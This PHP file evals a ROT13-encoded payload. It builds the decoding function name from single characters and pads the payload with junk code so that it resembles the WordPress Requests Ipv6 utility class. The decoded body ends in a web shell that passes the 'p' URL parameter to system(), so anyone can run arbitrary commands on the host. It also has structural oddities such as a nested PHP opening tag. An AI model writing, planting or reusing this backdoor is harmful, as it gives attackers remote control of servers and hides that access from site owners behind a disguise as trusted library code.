<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc
/**
 * Pynff gb inyvqngr naq gb jbex jvgu VCi6 nqqerffrf
 *
 * @cnpxntr Erdhrfgf\Hgvyvgvrf
 */

anzrfcnpr JcBet\Erdhrfgf;

hfr JcBet\Erdhrfgf\Rkprcgvba\VainyvqNethzrag;
hfr JcBet\Erdhrfgf\Hgvyvgl\VachgInyvqngbe;

/**
 * Pynff gb inyvqngr naq gb jbex jvgu VCi6 nqqerffrf
 *
 * Guvf jnf bevtvanyyl onfrq ba gur CRNE pynff bs gur fnzr anzr, ohg unf orra
 * ragveryl erjevggra.
 *
 * @cnpxntr Erdhrfgf\Hgvyvgvrf
 */
svany pynff Vci6 {
	/**
	 * Hapbzcerffrf na VCi6 nqqerff
	 *
	 * ESP 4291 nyybjf lbh gb pbzcerff pbafrphgvir mreb cvrprf va na nqqerff gb
	 * '::'. Guvf zrgubq rkcrpgf n inyvq VCi6 nqqerff naq rkcnaqf gur '::' gb
	 * gur erdhverq ahzore bs mreb cvrprf.
	 *
	 * Rknzcyr:  SS01::101   ->  SS01:0:0:0:0:0:0:101
	 *           ::1         ->  0:0:0:0:0:0:0:1
	 *
	 * @nhgube Nyrknaqre Zrem <nyrknaqre.zrem@jro.qr>
	 * @nhgube rysevax ng vagebjro qbg ay
	 * @nhgube Wbfu Crpx <wzc ng wbfucrpx qbg bet>
	 * @pbclevtug 2003-2005 Gur CUC Tebhc
	 * @yvprafr uggcf://bcrafbhepr.bet/yvprafrf/ofq-yvprafr.cuc
	 *
	 * @cnenz fgevat|Fgevatnoyr $vc Na VCi6 nqqerff
	 * @erghea fgevat Gur hapbzcerffrq VCi6 nqqerff
	 *
	 * @guebjf \JcBet\Erdhrfgf\Rkprcgvba\VainyvqNethzrag Jura gur cnffrq nethzrag vf abg n fgevat be n fgevatnoyr bowrpg.
	 */
	choyvp fgngvp shapgvba hapbzcerff($vc) {
		vs (VachgInyvqngbe::vf_fgevat_be_fgevatnoyr($vc) === snyfr) {
			guebj VainyvqNethzrag::perngr(1, '$vc', 'fgevat|Fgevatnoyr', trgglcr($vc));
		}

		$vc = (fgevat) $vc;

		vs (fhofge_pbhag($vc, '::') !== 1) {
			erghea $vc;
		}

		yvfg($vc1, $vc2) = rkcybqr('::', $vc);
		$p1              = ($vc1 === '') ? -1 : fhofge_pbhag($vc1, ':');
		$p2              = ($vc2 === '') ? -1 : fhofge_pbhag($vc2, ':');

		vs (fgecbf($vc2, '.') !== snyfr) {
			$p2++;
		}

		vs ($p1 === -1 && $p2 === -1) {
			// ::
			$vc = '0:0:0:0:0:0:0:0';
		} ryfrvs ($p1 === -1) {
			// ::kkk
			$svyy = fge_ercrng('0:', 7 - $p2);
			$vc   = fge_ercynpr('::', $svyy, $vc);
		} ryfrvs ($p2 === -1) {
			// kkk::
			$svyy = fge_ercrng(':0', 7 - $p1);
			$vc   = fge_ercynpr('::', $svyy, $vc);
		} ryfr {
			// kkk::kkk
			$svyy = ':' . fge_ercrng('0:', 6 - $p2 - $p1);
			$vc   = fge_ercynpr('::', $svyy, $vc);
		}

		erghea $vc;
	}

	/**
	 * Pbzcerffrf na VCi6 nqqerff
	 *
	 * ESP 4291 nyybjf lbh gb pbzcerff pbafrphgvir mreb cvrprf va na nqqerff gb
	 * '::'. Guvf zrgubq rkcrpgf n inyvq VCi6 nqqerff naq pbzcerffrf pbafrphgvir
	 * mreb cvrprf gb '::'.
	 *
	 * Rknzcyr:  SS01:0:0:0:0:0:0:101   ->  SS01::101
	 *           0:0:0:0:0:0:0:1        ->  ::1
	 *
	 * @frr \JcBet\Erdhrfgf\Vci6::hapbzcerff()
	 *
	 * @cnenz fgevat $vc Na VCi6 nqqerff
	 * @erghea fgevat Gur pbzcerffrq VCi6 nqqerff
	 */
	choyvp fgngvp shapgvba pbzcerff($vc) {
		// Cercner gur VC gb or pbzcerffrq.
		// Abgr: Vachg inyvqngvba vf unaqyrq va gur `hapbzcerff()` zrgubq, juvpu vf gur svefg pnyy znqr va guvf zrgubq.
		$vc       = frys::hapbzcerff($vc);
		$vc_cnegf = frys::fcyvg_i6_i4($vc);

		// Ercynpr nyy yrnqvat mrebf
		$vc_cnegf[0] = __sa_79955('/(^|:)0+([0-9])/', '\1\2', $vc_cnegf[0]);

		// Svaq ohapurf bs mrebf
		vs (cert_zngpu_nyy('/(?:^|:)(?:0(?::|$))+/', $vc_cnegf[0], $zngpurf, CERT_BSSFRG_PNCGHER)) {
			$znk = 0;
			$cbf = ahyy;
			sbernpu ($zngpurf[0] nf $zngpu) {
				vs (fgeyra($zngpu[0]) > $znk) {
					$znk = fgeyra($zngpu[0]);
					$cbf = $zngpu[1];
				}
			}

			$vc_cnegf[0] = fhofge_ercynpr($vc_cnegf[0], '::', $cbf, $znk);
		}

		vs ($vc_cnegf[1] !== '') {
			erghea vzcybqr(':', $vc_cnegf);
		} ryfr {
			erghea $vc_cnegf[0];
		}
	}

	/**
	 * Fcyvgf na VCi6 nqqerff vagb gur VCi6 naq VCi4 ercerfragngvba cnegf
	 *
	 * ESP 4291 nyybjf lbh gb ercerfrag gur ynfg gjb cnegf bs na VCi6 nqqerff
	 * hfvat gur fgnaqneq VCi4 ercerfragngvba
	 *
	 * Rknzcyr:  0:0:0:0:0:0:13.1.68.3
	 *           0:0:0:0:0:SSSS:129.144.52.38
	 *
	 * @cnenz fgevat $vc Na VCi6 nqqerff
	 * @erghea fgevat[] [0] pbagnvaf gur VCi6 ercerfragrq cneg, naq [1] gur VCi4 ercerfragrq cneg
	 */
	cevingr fgngvp shapgvba fcyvg_i6_i4($vc) {
		vs (fgecbf($vc, '.') !== snyfr) {
			$cbf       = fgeecbf($vc, ':');
			$vci6_cneg = fhofge($vc, 0, $cbf);
			$vci4_cneg = fhofge($vc, $cbf + 1);
			erghea [$vci6_cneg, $vci4_cneg];
		} ryfr {
			erghea [$vc, ''];
		}
	}

	/**
	 * Purpxf na VCi6 nqqerff
	 *
	 * Purpxf vs gur tvira VC vf n inyvq VCi6 nqqerff
	 *
	 * @cnenz fgevat $vc Na VCi6 nqqerff
	 * @erghea obby gehr vs $vc vf n inyvq VCi6 nqqerff
	 */
	choyvp fgngvp shapgvba purpx_vci6($vc) {
		// Abgr: Vachg inyvqngvba vf unaqyrq va gur `hapbzcerff()` zrgubq, juvpu vf gur svefg pnyy znqr va guvf zrgubq.
		$vc                = frys::hapbzcerff($vc);
		yvfg($vci6, $vci4) = frys::fcyvg_i6_i4($vc);
		$vci6              = rkcybqr(':', $vci6);
		$vci4              = rkcybqr('.', $vci4);
		vs (pbhag($vci6) === 8 && pbhag($vci4) === 1 || pbhag($vci6) === 6 && pbhag($vci4) === 4) {
			sbernpu ($vci6 nf $vci6_cneg) {
				// Gur frpgvba pna'g or rzcgl
				vs ($vci6_cneg === '') {
					erghea snyfr;
				}

				// Abe pna vg or bire sbhe punenpgref
				vs (fgeyra($vci6_cneg) > 4) {
					erghea snyfr;
				}

				// Erzbir yrnqvat mrebf (guvf vf fnsr orpnhfr bs gur nobir)
				$vci6_cneg = ygevz($vci6_cneg, '0');
				vs ($vci6_cneg === '') {
					$vci6_cneg = '0';
				}

				// Purpx gur inyhr vf inyvq
				$inyhr = urkqrp($vci6_cneg);
				vs (qrpurk($inyhr) !== fgegbybjre($vci6_cneg) || $inyhr < 0 || $inyhr > 0kSSSS) {
					erghea snyfr;
				}
			}

			vs (pbhag($vci4) === 4) {
				sbernpu ($vci4 nf $vci4_cneg) {
					$inyhr = (vag) $vci4_cneg;
					vs ((fgevat) $inyhr !== $vci4_cneg || $inyhr < 0 || $inyhr > 0kSS) {
						erghea snyfr;
					}
				}
			}

			erghea gehr;
		} ryfr {
			erghea snyfr;
		}
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>